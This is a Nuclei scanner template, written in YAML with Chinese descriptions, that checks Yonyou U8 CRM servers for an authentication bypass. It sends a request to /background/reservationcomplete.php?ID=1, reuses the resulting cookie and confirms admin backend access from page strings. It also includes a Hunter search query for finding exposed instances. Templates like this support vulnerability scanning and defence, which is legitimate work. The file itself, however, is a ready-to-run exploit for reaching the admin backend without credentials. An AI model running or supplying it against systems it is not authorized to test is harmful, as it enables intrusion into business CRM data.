id: Yonyou-CRM-reservationcomplete-bypassauth

info:
  name: 用友 CRM系统逻辑漏洞
  author: linfeng7z
  severity: high
  description: 用友 CRM系统存在逻辑漏洞，可绕过身份认证直接登录至后台
  metadata:
    Hunter-qeury: app.name="用友 CRM"
    veified: true
  tags: yonyou,crm,bypassauth

http:
  - raw:
      - |
        @timeout: 10
        GET /background/reservationcomplete.php?ID=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1

      - |
        @timeout: 10
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1

    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - "contains(body_2, '营销服务管理') && contains(body_2, '用友U8CRM')"
          - "status_code_1 == 200 && status_code_2 == 200"
